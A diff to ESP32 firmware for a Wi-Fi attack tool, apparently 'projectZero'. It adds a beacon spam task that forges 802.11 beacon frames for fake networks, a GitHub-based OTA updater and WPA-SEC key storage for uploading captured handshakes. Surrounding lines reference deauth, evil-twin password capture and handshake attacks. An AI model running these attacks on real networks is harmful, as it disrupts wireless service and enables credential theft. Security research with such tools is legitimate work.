@@ -48,8 +48,15 @@
 #include "mbedtls/ctr_drbg.h"
 #include "mbedtls/entropy.h"
 #include "esp_timer.h"
+#include "esp_app_format.h"
 
 #include "esp_http_server.h"
+#include "esp_http_client.h"
+#include "esp_tls.h"
+#include "esp_https_ota.h"
+#include "esp_ota_ops.h"
+#include "esp_crt_bundle.h"
+#include "cJSON.h"
 #include "esp_netif.h"
 #include "lwip/err.h"
 #include "lwip/sys.h"
@@ -58,9 +65,11 @@
 #include "lwip/dhcp.h"
 #include "lwip/etharp.h"
 #include "lwip/netif.h"
+#include "lwip/ip_addr.h"
 #include "lwip/ip4_addr.h"
 #include "lwip/prot/ethernet.h"
 #include "lwip/pbuf.h"
+#include "linenoise/linenoise.h"
 #include "esp_netif_net_stack.h"
 
 #include "attack_handshake.h"
@@ -93,7 +102,26 @@
 #endif
 
 //Version number
-#define JANOS_VERSION "1.1.3"
+#define JANOS_VERSION "1.3.2"
+
+#define OTA_GITHUB_OWNER "C5Lab"
+#define OTA_GITHUB_REPO "projectZero"
+#define OTA_ASSET_NAME "projectZero.bin"
+#define OTA_HTTP_MAX_BODY (64 * 1024)
+#define OTA_TASK_STACK_SIZE 8192
+#define OTA_TASK_PRIORITY 5
+#define OTA_CHANNEL_MAX_LEN 8
+#define OTA_NVS_NAMESPACE "ota"
+#define OTA_NVS_KEY_CHANNEL "channel"
+#define OTA_DEV_BRANCH "development"
+#define OTA_PROJECT_NAME "projectZero"
+
+// WPA-SEC cloud upload
+#define WPASEC_NVS_NAMESPACE "wpasec"
+#define WPASEC_NVS_KEY       "api_key"
+#define WPASEC_URL           "https://wpa-sec.stanev.org/"
+#define WPASEC_KEY_MAX_LEN   65
+
 
 
 #define NEOPIXEL_GPIO      27
@@ -212,6 +240,9 @@ static volatile bool operation_stop_requested = false;
 // wifi_connect command state: 0 = pending, 1 = success, -1 = failed
 static volatile int wifi_connect_result = 0;
 
+// WPA-SEC API key (loaded from NVS on boot)
+static char wpasec_api_key[WPASEC_KEY_MAX_LEN] = "";
+
 // ARP ban state
 static volatile bool arp_ban_active = false;
 static TaskHandle_t arp_ban_task_handle = NULL;
@@ -317,6 +348,13 @@ static int handshake_target_count = 0;
 static bool handshake_captured[MAX_AP_CNT]; // Track which networks have captured handshakes
 static int handshake_current_index = 0;
 
+// Beacon spam task
+static TaskHandle_t beacon_spam_task_handle = NULL;
+static volatile bool beacon_spam_active = false;
+#define MAX_BEACON_SSIDS 32
+static char beacon_ssids[MAX_BEACON_SSIDS][33];
+static int beacon_ssid_count = 0;
+
 // Channel lists for 2.4GHz and 5GHz
 static const uint8_t channels_24ghz[] = {1, 6, 11, 2, 7, 3, 8, 4, 9, 5, 10, 12, 13};
 static const uint8_t channels_5ghz[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
@@ -361,6 +399,13 @@ static bool netif_initialized = false;
 static bool event_loop_initialized = false;
 static esp_netif_t *sta_netif_handle = NULL;
 static bool wifi_event_handler_registered = false;
+static bool ip_event_handler_registered = false;
+static bool ota_check_started = false;
+static bool ota_check_in_progress = false;
+static char ota_channel[OTA_CHANNEL_MAX_LEN] = "main";
+static bool ota_auto_on_ip = false;
+static TaskHandle_t ota_led_task_handle = NULL;
+static volatile bool ota_led_active = false;
 
 // ============================================================================
 // Memory logging helper (set LOG_MEMORY_INFO to 1 to enable prints)
@@ -539,6 +584,157 @@ void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
     }
 
     //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false));
+}
+
+/**
+ * Build a beacon frame with specified SSID
+ * Returns the size of the beacon frame
+ */
+static int build_beacon_frame(uint8_t *frame_buffer, size_t buffer_size, const char *ssid, const uint8_t *bssid, uint8_t channel) {
+    if (!frame_buffer || !ssid || !bssid || buffer_size < 200) {
+        return 0;
+    }
+
+    int ssid_len = strlen(ssid);
+    if (ssid_len > 32) {
+        ssid_len = 32;
+    }
+
+    int pos = 0;
+
+    // Frame Control: Type=Management(0), Subtype=Beacon(8) = 0x80
+    frame_buffer[pos++] = 0x80;
+    frame_buffer[pos++] = 0x00;
+
+    // Duration
+    frame_buffer[pos++] = 0x00;
+    frame_buffer[pos++] = 0x00;
+
+    // Destination Address (broadcast)
+    memset(&frame_buffer[pos], 0xFF, 6);
+    pos += 6;
+
+    // Source Address (BSSID)
+    memcpy(&frame_buffer[pos], bssid, 6);
+    pos += 6;
+
+    // BSSID
+    memcpy(&frame_buffer[pos], bssid, 6);
+    pos += 6;
+
+    // Sequence Control
+    frame_buffer[pos++] = 0x00;
+    frame_buffer[pos++] = 0x00;
+
+    // Beacon Frame Body
+    // Timestamp (8 bytes)
+    uint64_t timestamp = esp_timer_get_time();
+    memcpy(&frame_buffer[pos], &timestamp, 8);
+    pos += 8;
+
+    // Beacon Interval (100 TU = 102.4 ms)
+    frame_buffer[pos++] = 0x64;
+    frame_buffer[pos++] = 0x00;
+
+    // Capability Info (ESS, no privacy)
+    frame_buffer[pos++] = 0x01;
+    frame_buffer[pos++] = 0x00;
+
+    // Tagged parameters
+    // SSID parameter set
+    frame_buffer[pos++] = 0x00; // Tag: SSID
+    frame_buffer[pos++] = ssid_len; // Length
+    memcpy(&frame_buffer[pos], ssid, ssid_len);
+    pos += ssid_len;
+
+    // Supported Rates
+    frame_buffer[pos++] = 0x01; // Tag: Supported Rates
+    frame_buffer[pos++] = 0x08; // Length
+    frame_buffer[pos++] = 0x82; // 1 Mbps (basic)
+    frame_buffer[pos++] = 0x84; // 2 Mbps (basic)
+    frame_buffer[pos++] = 0x8B; // 5.5 Mbps (basic)
+    frame_buffer[pos++] = 0x96; // 11 Mbps (basic)
+    frame_buffer[pos++] = 0x24; // 18 Mbps
+    frame_buffer[pos++] = 0x30; // 24 Mbps
+    frame_buffer[pos++] = 0x48; // 36 Mbps
+    frame_buffer[pos++] = 0x6C; // 54 Mbps
+
+    // DS Parameter Set (channel)
+    frame_buffer[pos++] = 0x03; // Tag: DS Parameter
+    frame_buffer[pos++] = 0x01; // Length
+    frame_buffer[pos++] = channel; // Channel from parameter
+
+    return pos;
+}
+
+/**
+ * Send a beacon frame
+ */
+static void send_beacon_frame(const uint8_t *frame_buffer, int size) {
+    if (!frame_buffer || size <= 0) {
+        return;
+    }
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
+    if (err == ESP_ERR_NO_MEM) {
+        vTaskDelay(pdMS_TO_TICKS(20));
+        return;
+    }
+}
+
+/**
+ * Beacon spam task - continuously sends beacon frames for configured SSIDs
+ * Sends on all 2.4GHz channels (1-13) with channel hopping
+ */
+static void beacon_spam_task(void *pvParameters) {
+    (void)pvParameters;
+    
+    MY_LOG_INFO(TAG, "Beacon spam task started with %d SSIDs on channels 1-13", beacon_ssid_count);
+    
+    // Static BSSID for all fake APs
+    const uint8_t bssid[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
+    
+    // Frame buffer
+    uint8_t frame_buffer[256];
+    
+    // 2.4GHz channels to use
+    const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
+    const int num_channels = sizeof(channels) / sizeof(channels[0]);
+    
+    while (beacon_spam_active && !operation_stop_requested) {
+        // Iterate through all channels
+        for (int ch_idx = 0; ch_idx < num_channels && beacon_spam_active && !operation_stop_requested; ch_idx++) {
+            uint8_t current_channel = channels[ch_idx];
+            
+            // Set WiFi channel
+            esp_err_t err = esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
+            if (err != ESP_OK) {
+                MY_LOG_INFO(TAG, "Failed to set channel %d: %s", current_channel, esp_err_to_name(err));
+            }
+            
+            // Small delay to allow channel switch
+            vTaskDelay(pdMS_TO_TICKS(10));
+            
+            // Send beacons for all SSIDs on this channel
+            for (int i = 0; i < beacon_ssid_count && beacon_spam_active && !operation_stop_requested; i++) {
+                // Build beacon frame for this SSID on current channel
+                int frame_size = build_beacon_frame(frame_buffer, sizeof(frame_buffer), beacon_ssids[i], bssid, current_channel);
+                
+                if (frame_size > 0) {
+                    // Send the beacon frame
+                    send_beacon_frame(frame_buffer, frame_size);
+                }
+                
+                // Fast delay between beacons (10ms for faster transmission)
+                vTaskDelay(pdMS_TO_TICKS(10));
+            }
+        }
+    }
+    
+    MY_LOG_INFO(TAG, "Beacon spam task stopped");
+    beacon_spam_active = false;
+    beacon_spam_task_handle = NULL;
+    vTaskDelete(NULL);
 }
 
 
@@ -853,6 +1049,7 @@ static int cmd_select_networks(int argc, char **argv);
 static int cmd_unselect_networks(int argc, char **argv);
 static int cmd_select_stations(int argc, char **argv);
 static int cmd_unselect_stations(int argc, char **argv);
+static int cmd_start_beacon_spam(int argc, char **argv);
 static int cmd_start_evil_twin(int argc, char **argv);
 static int cmd_start_handshake(int argc, char **argv);
 static int cmd_save_handshake(int argc, char **argv);
@@ -893,7 +1090,14 @@ static int cmd_reboot(int argc, char **argv);
 static int cmd_led(int argc, char **argv);
 static int cmd_vendor(int argc, char **argv);
 static int cmd_download(int argc, char **argv);
+static int cmd_wpasec_key(int argc, char **argv);
+static int cmd_wpasec_upload(int argc, char **argv);
 static int cmd_channel_time(int argc, char **argv);
+static int cmd_ota_check(int argc, char **argv);
+static int cmd_ota_list(int argc, char **argv);
+static int cmd_ota_channel(int argc, char **argv);
+static int cmd_ota_info(int argc, char **argv);
+static int cmd_ota_boot(int argc, char **argv);
 static esp_err_t start_background_scan(uint32_t min_time, uint32_t max_time);
 static void print_scan_results(void);
 static void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count);
@@ -907,6 +1111,7 @@ static void deauth_attack_task(void *pvParameters);
 static void blackout_attack_task(void *pvParameters);
 static void sae_attack_task(void *pvParameters);
 static void handshake_attack_task(void *pvParameters);
+static void beacon_spam_task(void *pvParameters);
 static bool check_handshake_file_exists(const char *ssid);
 static void handshake_cleanup(void);
 static void quick_scan_all_channels(void);
@@ -1041,6 +1246,27 @@ static void wifi_event_handler(void *event_handler_arg,
                                esp_event_base_t event_base,
                                int32_t event_id,
                                void *event_data);
+static void ip_event_handler(void *event_handler_arg,
+                             esp_event_base_t event_base,
+                             int32_t event_id,
+                             void *event_data);
+static void ota_check_task(void *pvParameters);
+static esp_err_t ota_fetch_latest_release(char *url_out, size_t url_len,
+                                          char *tag_out, size_t tag_len);
+static esp_err_t ota_fetch_release_by_tag(const char *tag,
+                                          char *url_out, size_t url_len,
+                                          char *tag_out, size_t tag_len);
+static esp_err_t ota_build_branch_url(char *url_out, size_t url_len);
+static bool ota_is_newer_version(const char *current, const char *latest);
+static bool ota_has_ip(void);
+static bool ota_is_connected(void);
+static bool ota_start_check(const char *tag, bool force_latest);
+static void ota_load_channel_from_nvs(void);
+static bool ota_save_channel_to_nvs(const char *channel);
+static void ota_mark_valid_if_pending(void);
+static void ota_log_boot_info(void);
+static void ota_led_start(void);
+static void ota_led_stop(void);
 
 static esp_err_t wifi_init_ap_sta(void);
 static esp_err_t bt_nimble_init(void);
@@ -1319,6 +1545,562 @@ static void wifi_event_handler(void *event_handler_arg,
     }
 }
 
+static bool ota_parse_version(const char *version, int *major, int *minor, int *patch) {
+    if (!version || !major || !minor || !patch) {
+        return false;
+    }
+
+    while (*version == 'v' || *version == 'V' || isspace((unsigned char)*version)) {
+        version++;
+    }
+
+    int maj = 0;
+    int min = 0;
+    int pat = 0;
+    int parsed = sscanf(version, "%d.%d.%d", &maj, &min, &pat);
+    if (parsed < 1) {
+        return false;
+    }
+
+    *major = maj;
+    *minor = (parsed >= 2) ? min : 0;
+    *patch = (parsed >= 3) ? pat : 0;
+    return true;
+}
+
+static bool ota_is_newer_version(const char *current, const char *latest) {
+    int cur_maj = 0;
+    int cur_min = 0;
+    int cur_pat = 0;
+    int lat_maj = 0;
+    int lat_min = 0;
+    int lat_pat = 0;
+
+    if (!ota_parse_version(current, &cur_maj, &cur_min, &cur_pat) ||
+        !ota_parse_version(latest, &lat_maj, &lat_min, &lat_pat)) {
+        MY_LOG_INFO(TAG, "OTA: version parse failed (current=%s, latest=%s)", current, latest);
+        return false;
+    }
+
+    if (lat_maj != cur_maj) {
+        return lat_maj > cur_maj;
+    }
+    if (lat_min != cur_min) {
+        return lat_min > cur_min;
+    }
+    return lat_pat > cur_pat;
+}
+
+static esp_err_t ota_http_get(const char *url, char **out_buf, size_t *out_len) {
+    if (!url || !out_buf || !out_len) {
+        return ESP_ERR_INVALID_ARG;
+    }
+
+    *out_buf = NULL;
+    *out_len = 0;
+
+    esp_http_client_config_t config = {
+        .url = url,
+        .timeout_ms = 10000,
+        .crt_bundle_attach = esp_crt_bundle_attach,
+    };
+    esp_http_client_handle_t client = esp_http_client_init(&config);
+    if (!client) {
+        return ESP_FAIL;
+    }
+
+    esp_http_client_set_header(client, "User-Agent", "projectZero-ota");
+    esp_http_client_set_header(client, "Accept", "application/vnd.github+json");
+
+    esp_err_t err = esp_http_client_open(client, 0);
+    if (err != ESP_OK) {
+        MY_LOG_INFO(TAG, "OTA: http open failed: %s", esp_err_to_name(err));
+        esp_http_client_cleanup(client);
+        return err;
+    }
+
+    esp_http_client_fetch_headers(client);
+    int status = esp_http_client_get_status_code(client);
+    if (status != 200) {
+        MY_LOG_INFO(TAG, "OTA: http status %d for %s", status, url);
+        esp_http_client_close(client);
+        esp_http_client_cleanup(client);
+        return ESP_FAIL;
+    }
+
+    char *buf = calloc(1, OTA_HTTP_MAX_BODY + 1);
+    if (!buf) {
+        esp_http_client_close(client);
+        esp_http_client_cleanup(client);
+        return ESP_ERR_NO_MEM;
+    }
+
+    size_t total = 0;
+    while (total < OTA_HTTP_MAX_BODY) {
+        int read_len = esp_http_client_read(client, buf + total, OTA_HTTP_MAX_BODY - total);
+        if (read_len < 0) {
+            MY_LOG_INFO(TAG, "OTA: http read failed");
+            free(buf);
+            esp_http_client_close(client);
+            esp_http_client_cleanup(client);
+            return ESP_FAIL;
+        }
+        if (read_len == 0) {
+            break;
+        }
+        total += (size_t)read_len;
+    }
+
+    if (total >= OTA_HTTP_MAX_BODY) {
+        MY_LOG_INFO(TAG, "OTA: response too large");
+        free(buf);
+        esp_http_client_close(client);
+        esp_http_client_cleanup(client);
+        return ESP_ERR_NO_MEM;
+    }
+
+    buf[total] = '\0';
+    *out_buf = buf;
+    *out_len = total;
+
+    esp_http_client_close(client);
+    esp_http_client_cleanup(client);
+    return ESP_OK;
+}
+
+static esp_err_t ota_fetch_latest_release(char *url_out, size_t url_len,
+                                          char *tag_out, size_t tag_len) {
+    char api_url[256];
+    int res = snprintf(api_url, sizeof(api_url),
+                       "https://api.github.com/repos/%s/%s/releases/latest",
+                       OTA_GITHUB_OWNER, OTA_GITHUB_REPO);
+    if (res < 0 || res >= (int)sizeof(api_url)) {
+        return ESP_ERR_INVALID_SIZE;
+    }
+
+    char *body = NULL;
+    size_t body_len = 0;
+    esp_err_t err = ota_http_get(api_url, &body, &body_len);
+    if (err != ESP_OK) {
+        return err;
+    }
+    (void)body_len;
+
+    cJSON *root = cJSON_Parse(body);
+    if (!root) {
+        free(body);
+        return ESP_FAIL;
+    }
+
+    cJSON *tag = cJSON_GetObjectItem(root, "tag_name");
+    cJSON *assets = cJSON_GetObjectItem(root, "assets");
+    if (!cJSON_IsString(tag) || !cJSON_IsArray(assets)) {
+        cJSON_Delete(root);
+        free(body);
+        return ESP_FAIL;
+    }
+
+    cJSON *asset = NULL;
+    cJSON_ArrayForEach(asset, assets) {
+        cJSON *name = cJSON_GetObjectItem(asset, "name");
+        if (cJSON_IsString(name) && strcmp(name->valuestring, OTA_ASSET_NAME) == 0) {
+            break;
+        }
+    }
+
+    if (!asset) {
+        MY_LOG_INFO(TAG, "OTA: asset %s not found in release", OTA_ASSET_NAME);
+        cJSON_Delete(root);
+        free(body);
+        return ESP_ERR_NOT_FOUND;
+    }
+
+    cJSON *download = cJSON_GetObjectItem(asset, "browser_download_url");
+    cJSON *size = cJSON_GetObjectItem(asset, "size");
+    cJSON *updated = cJSON_GetObjectItem(asset, "updated_at");
+    if (!cJSON_IsString(download)) {
+        cJSON_Delete(root);
+        free(body);
+        return ESP_FAIL;
+    }
+
+    snprintf(tag_out, tag_len, "%s", tag->valuestring);
+    snprintf(url_out, url_len, "%s", download->valuestring);
+    if (cJSON_IsNumber(size)) {
+        MY_LOG_INFO(TAG, "OTA: asset size=%lu bytes", (unsigned long)size->valuedouble);
+    }
+    if (cJSON_IsString(updated)) {
+        MY_LOG_INFO(TAG, "OTA: asset updated_at=%s", updated->valuestring);
+    }
+
+    cJSON_Delete(root);
+    free(body);
+    return ESP_OK;
+}
+
+static esp_err_t ota_fetch_release_by_tag(const char *tag,
+                                          char *url_out, size_t url_len,
+                                          char *tag_out, size_t tag_len) {
+    if (!tag || !*tag) {
+        return ESP_ERR_INVALID_ARG;
+    }
+
+    char api_url[256];
+    int res = snprintf(api_url, sizeof(api_url),
+                       "https://api.github.com/repos/%s/%s/releases/tags/%s",
+                       OTA_GITHUB_OWNER, OTA_GITHUB_REPO, tag);
+    if (res < 0 || res >= (int)sizeof(api_url)) {
+        return ESP_ERR_INVALID_SIZE;
+    }
+
+    char *body = NULL;
+    size_t body_len = 0;
+    esp_err_t err = ota_http_get(api_url, &body, &body_len);
+    if (err != ESP_OK) {
+        return err;
+    }
+    (void)body_len;
+
+    cJSON *root = cJSON_Parse(body);
+    if (!root) {
+        free(body);
+        return ESP_FAIL;
+    }
+
+    cJSON *tag_json = cJSON_GetObjectItem(root, "tag_name");
+    cJSON *assets = cJSON_GetObjectItem(root, "assets");
+    if (!cJSON_IsString(tag_json) || !cJSON_IsArray(assets)) {
+        cJSON_Delete(root);
+        free(body);
+        return ESP_FAIL;
+    }
+
+    cJSON *asset = NULL;
+    cJSON_ArrayForEach(asset, assets) {
+        cJSON *name = cJSON_GetObjectItem(asset, "name");
+        if (cJSON_IsString(name) && strcmp(name->valuestring, OTA_ASSET_NAME) == 0) {
+            break;
+        }
+    }
+
+    if (!asset) {
+        MY_LOG_INFO(TAG, "OTA: asset %s not found for tag %s", OTA_ASSET_NAME, tag);
+        cJSON_Delete(root);
+        free(body);
+        return ESP_ERR_NOT_FOUND;
+    }
+
+    cJSON *download = cJSON_GetObjectItem(asset, "browser_download_url");
+    cJSON *size = cJSON_GetObjectItem(asset, "size");
+    cJSON *updated = cJSON_GetObjectItem(asset, "updated_at");
+    if (!cJSON_IsString(download)) {
+        cJSON_Delete(root);
+        free(body);
+        return ESP_FAIL;
+    }
+
+    snprintf(tag_out, tag_len, "%s", tag_json->valuestring);
+    snprintf(url_out, url_len, "%s", download->valuestring);
+    if (cJSON_IsNumber(size)) {
+        MY_LOG_INFO(TAG, "OTA: asset size=%lu bytes", (unsigned long)size->valuedouble);
+    }
+    if (cJSON_IsString(updated)) {
+        MY_LOG_INFO(TAG, "OTA: asset updated_at=%s", updated->valuestring);
+    }
+
+    cJSON_Delete(root);
+    free(body);
+    return ESP_OK;
+}
+
+static esp_err_t ota_build_branch_url(char *url_out, size_t url_len) {
+    int res = snprintf(url_out, url_len,
+                       "https://raw.githubusercontent.com/%s/%s/%s/ESP32C5/binaries-esp32c5/%s",
+                       OTA_GITHUB_OWNER, OTA_GITHUB_REPO, OTA_DEV_BRANCH, OTA_ASSET_NAME);
+    if (res < 0 || res >= (int)url_len) {
+        return ESP_ERR_INVALID_SIZE;
+    }
+    return ESP_OK;
+}
+
+static bool ota_is_expected_project(const esp_app_desc_t *desc) {
+    if (!desc) {
+        return false;
+    }
+
+    if (strncmp(desc->project_name, OTA_PROJECT_NAME, sizeof(desc->project_name)) != 0) {
+        MY_LOG_INFO(TAG, "OTA: unexpected project '%s'", desc->project_name);
+        return false;
+    }
+    return true;
+}
+
+static esp_err_t ota_perform_https_update(const char *download_url) {
+    if (!download_url || !*download_url) {
+        return ESP_ERR_INVALID_ARG;
+    }
+
+    esp_http_client_config_t http_cfg = {
+        .url = download_url,
+        .timeout_ms = 15000,
+        .buffer_size = 16 * 1024,
+        .buffer_size_tx = 4 * 1024,
+        .crt_bundle_attach = esp_crt_bundle_attach,
+    };
+    esp_https_ota_config_t ota_cfg = {
+        .http_config = &http_cfg,
+    };
+
+    esp_https_ota_handle_t ota_handle = NULL;
+    esp_err_t err = esp_https_ota_begin(&ota_cfg, &ota_handle);
+    if (err != ESP_OK) {
+        MY_LOG_INFO(TAG, "OTA: begin failed: %s", esp_err_to_name(err));
+        return err;
+    }
+
+    esp_app_desc_t app_desc = {0};
+    err = esp_https_ota_get_img_desc(ota_handle, &app_desc);
+    if (err != ESP_OK) {
+        MY_LOG_INFO(TAG, "OTA: image desc failed: %s", esp_err_to_name(err));
+        esp_https_ota_abort(ota_handle);
+        return err;
+    }
+
+    MY_LOG_INFO(TAG, "OTA: image project=%s version=%s idf=%s",
+                app_desc.project_name, app_desc.version, app_desc.idf_ver);
+    if (!ota_is_expected_project(&app_desc)) {
+        esp_https_ota_abort(ota_handle);
+        return ESP_ERR_INVALID_STATE;
+    }
+
+    while ((err = esp_https_ota_perform(ota_handle)) == ESP_ERR_HTTPS_OTA_IN_PROGRESS) {
+        vTaskDelay(pdMS_TO_TICKS(10));
+    }
+    if (err != ESP_OK) {
+        MY_LOG_INFO(TAG, "OTA: perform failed: %s", esp_err_to_name(err));
+        esp_https_ota_abort(ota_handle);
+        return err;
+    }
+
+    if (!esp_https_ota_is_complete_data_received(ota_handle)) {
+        MY_LOG_INFO(TAG, "OTA: incomplete image");
+        esp_https_ota_abort(ota_handle);
+        return ESP_FAIL;
+    }
+
+    err = esp_https_ota_finish(ota_handle);
+    if (err != ESP_OK) {
+        MY_LOG_INFO(TAG, "OTA: finish failed: %s", esp_err_to_name(err));
+        return err;
+    }
+
+    return ESP_OK;
+}
+
+static bool ota_has_ip(void) {
+    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    if (!sta_netif) {
+        return false;
+    }
+
+    esp_netif_ip_info_t ip_info;
+    if (esp_netif_get_ip_info(sta_netif, &ip_info) != ESP_OK) {
+        return false;
+    }
+
+    return ip_info.ip.addr != 0;
+}
+
+static bool ota_is_connected(void) {
+    wifi_ap_record_t ap_info;
+    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
+        return false;
+    }
+    return ota_has_ip();
+}
+
+static void ota_led_task(void *pvParameters) {
+    (void)pvParameters;
+    if (!led_initialized) {
+        vTaskDelete(NULL);
+        return;
+    }
+
+    const int step = 15;
+    while (ota_led_active) {
+        for (int level = 0; level <= 255 && ota_led_active; level += step) {
+            led_set_color((uint8_t)level, 0, 0);
+            vTaskDelay(pdMS_TO_TICKS(30));
+        }
+        for (int level = 255; level >= 0 && ota_led_active; level -= step) {
+            led_set_color((uint8_t)level, 0, 0);
+            vTaskDelay(pdMS_TO_TICKS(30));
+        }
+    }
+
+    led_set_idle();
+    ota_led_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+static void ota_led_start(void) {
+    if (ota_led_task_handle != NULL || !led_initialized) {
+        return;
+    }
+
+    ota_led_active = true;
+    BaseType_t ok = xTaskCreate(ota_led_task, "ota_led", 2048, NULL, 3, &ota_led_task_handle);
+    if (ok != pdPASS) {
+        ota_led_task_handle = NULL;
+        ota_led_active = false;
+    }
+}
+
+static void ota_led_stop(void) {
+    if (ota_led_task_handle == NULL) {
+        return;
+    }
+    ota_led_active = false;
+}
+
+typedef struct {
+    char tag[64];
+    bool use_tag;
+    bool force_latest;
+} ota_check_args_t;
+
+static bool ota_start_check(const char *tag, bool force_latest) {
+    if (!ota_is_connected()) {
+        MY_LOG_INFO(TAG, "OTA: not connected or no IP, skipping");
+        return false;
+    }
+    if (ota_check_in_progress) {
+        MY_LOG_INFO(TAG, "OTA: check already in progress");
+        return false;
+    }
+
+    ota_check_in_progress = true;
+    ota_check_args_t *args = calloc(1, sizeof(*args));
+    if (!args) {
+        ota_check_in_progress = false;
+        MY_LOG_INFO(TAG, "OTA: out of memory");
+        return false;
+    }
+
+    if (tag && *tag) {
+        snprintf(args->tag, sizeof(args->tag), "%s", tag);
+        args->use_tag = true;
+    }
+    args->force_latest = force_latest;
+
+    BaseType_t task_ok = xTaskCreate(ota_check_task, "ota_check",
+                                     OTA_TASK_STACK_SIZE, args,
+                                     OTA_TASK_PRIORITY, NULL);
+    if (task_ok != pdPASS) {
+        free(args);
+        ota_check_in_progress = false;
+        MY_LOG_INFO(TAG, "OTA: failed to start check task");
+        return false;
+    }
+
+    return true;
+}
+
+static void ota_check_task(void *pvParameters) {
+    ota_check_args_t *args = (ota_check_args_t *)pvParameters;
+    if (!ota_is_connected()) {
+        MY_LOG_INFO(TAG, "OTA: not connected or no IP, aborting");
+        ota_check_in_progress = false;
+        free(args);
+        vTaskDelete(NULL);
+        return;
+    }
+
+    if (strcmp(OTA_GITHUB_OWNER, "your-org") == 0 ||
+        strcmp(OTA_GITHUB_REPO, "your-repo") == 0 ||
+        strcmp(OTA_ASSET_NAME, "firmware.bin") == 0) {
+        MY_LOG_INFO(TAG, "OTA: config not set, skipping update");
+        ota_check_in_progress = false;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    char latest_tag[64] = {0};
+    char download_url[256] = {0};
+    esp_err_t err = ESP_OK;
+    bool skip_version_check = false;
+    if (args && args->use_tag) {
+        err = ota_fetch_release_by_tag(args->tag, download_url, sizeof(download_url),
+                                       latest_tag, sizeof(latest_tag));
+    } else if (args && args->force_latest) {
+        err = ota_fetch_latest_release(download_url, sizeof(download_url),
+                                       latest_tag, sizeof(latest_tag));
+    } else if (strcmp(ota_channel, "dev") == 0) {
+        err = ota_build_branch_url(download_url, sizeof(download_url));
+        if (err == ESP_OK) {
+            snprintf(latest_tag, sizeof(latest_tag), "branch:%s", OTA_DEV_BRANCH);
+            skip_version_check = true;
+            MY_LOG_INFO(TAG, "OTA: dev channel uses branch '%s'", OTA_DEV_BRANCH);
+            MY_LOG_INFO(TAG, "OTA: branch url=%s", download_url);
+        }
+    } else {
+        err = ota_fetch_latest_release(download_url, sizeof(download_url),
+                                       latest_tag, sizeof(latest_tag));
+    }
+    if (err != ESP_OK) {
+        MY_LOG_INFO(TAG, "OTA: failed to fetch release info: %s", esp_err_to_name(err));
+        ota_check_in_progress = false;
+        free(args);
+        vTaskDelete(NULL);
+        return;
+    }
+
+    if (!skip_version_check && !(args && args->use_tag) &&
+        !ota_is_newer_version(JANOS_VERSION, latest_tag)) {
+        MY_LOG_INFO(TAG, "OTA: no update (current=%s, latest=%s)", JANOS_VERSION, latest_tag);
+        ota_check_in_progress = false;
+        free(args);
+        vTaskDelete(NULL);
+        return;
+    }
+
+    MY_LOG_INFO(TAG, "OTA: current=%s, target=%s", JANOS_VERSION, latest_tag);
+    MY_LOG_INFO(TAG, "OTA: updating to %s", latest_tag);
+    const esp_partition_t *target_part = esp_ota_get_next_update_partition(NULL);
+    MY_LOG_INFO(TAG, "OTA: target partition=%s offset=0x%lx",
+                target_part ? target_part->label : "n/a",
+                target_part ? (unsigned long)target_part->address : 0UL);
+    ota_led_start();
+    err = ota_perform_https_update(download_url);
+    ota_led_stop();
+    if (err == ESP_OK) {
+        MY_LOG_INFO(TAG, "OTA: update applied, restarting");
+        esp_restart();
+    } else {
+        MY_LOG_INFO(TAG, "OTA: update failed: %s", esp_err_to_name(err));
+    }
+
+    ota_check_in_progress = false;
+    free(args);
+    vTaskDelete(NULL);
+}
+
+static void ip_event_handler(void *event_handler_arg,
+                             esp_event_base_t event_base,
+                             int32_t event_id,
+                             void *event_data) {
+    (void)event_handler_arg;
+    (void)event_data;
+
+    if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
+        if (ota_auto_on_ip && !ota_check_started) {
+            if (ota_start_check(NULL, false)) {
+                ota_check_started = true;
+            }
+        }
+    }
+}
+
 // --- Password verification function (used by portal) ---
 static void verify_password(const char* password) {
     evilTwinPassword = malloc(strlen(password) + 1);
@@ -1374,6 +2156,134 @@ static void verify_password(const char* password) {
     esp_wifi_connect();
 }
 
+static void ota_load_channel_from_nvs(void) {
+    nvs_handle_t handle;
+    esp_err_t err = nvs_open(OTA_NVS_NAMESPACE, NVS_READONLY, &handle);
+    if (err != ESP_OK) {
+        return;
+    }
+
+    size_t len = sizeof(ota_channel);
+    err = nvs_get_str(handle, OTA_NVS_KEY_CHANNEL, ota_channel, &len);
+    if (err != ESP_OK) {
+        nvs_close(handle);
+        return;
+    }
+
+    if (strcasecmp(ota_channel, "main") != 0 && strcasecmp(ota_channel, "dev") != 0) {
+        snprintf(ota_channel, sizeof(ota_channel), "main");
+    }
+
+    nvs_close(handle);
+}
+
+static bool ota_save_channel_to_nvs(const char *channel) {
+    nvs_handle_t handle;
+    esp_err_t err = nvs_open(OTA_NVS_NAMESPACE, NVS_READWRITE, &handle);
+    if (err != ESP_OK) {
+        return false;
+    }
+
+    err = nvs_set_str(handle, OTA_NVS_KEY_CHANNEL, channel);
+    if (err == ESP_OK) {
+        err = nvs_commit(handle);
+    }
+    nvs_close(handle);
+    return err == ESP_OK;
+}
+
+// --------------- WPA-SEC NVS helpers ---------------
+
+static void wpasec_load_key_from_nvs(void) {
+    nvs_handle_t handle;
+    esp_err_t err = nvs_open(WPASEC_NVS_NAMESPACE, NVS_READONLY, &handle);
+    if (err != ESP_OK) {
+        return;
+    }
+
+    size_t len = sizeof(wpasec_api_key);
+    err = nvs_get_str(handle, WPASEC_NVS_KEY, wpasec_api_key, &len);
+    if (err != ESP_OK) {
+        wpasec_api_key[0] = '\0';
+    }
+    nvs_close(handle);
+}
+
